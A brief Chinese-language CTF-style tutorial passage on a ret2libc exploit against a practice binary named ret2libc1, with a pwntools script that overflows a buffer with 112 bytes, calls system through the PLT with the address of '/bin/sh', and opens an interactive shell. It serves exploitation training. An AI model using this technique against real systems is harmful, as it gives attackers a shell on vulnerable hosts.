+ 首先找到 `system` 的libc地址，然后找到 `bin_sh` 字符串的地址，通过调用 `plt` 表中的 `system` 函数，并将 `bin_sh` 的地址作为其参数传入。

```python3
from pwn import *

io = process("./ret2libc1")

elf = ELF("./ret2libc1")

system_plt = elf.plt["system"]

bin_sh = next(elf.search(b"/bin/sh"))  # elf.search返回的是一个迭代器，要用next获取第一个元素

print(hex(bin_sh))

print(hex(system_plt))

payload = flat([b'A' * 112, system_plt, b'aaaa', bin_sh])

io.sendline(payload)

io.interactive()
```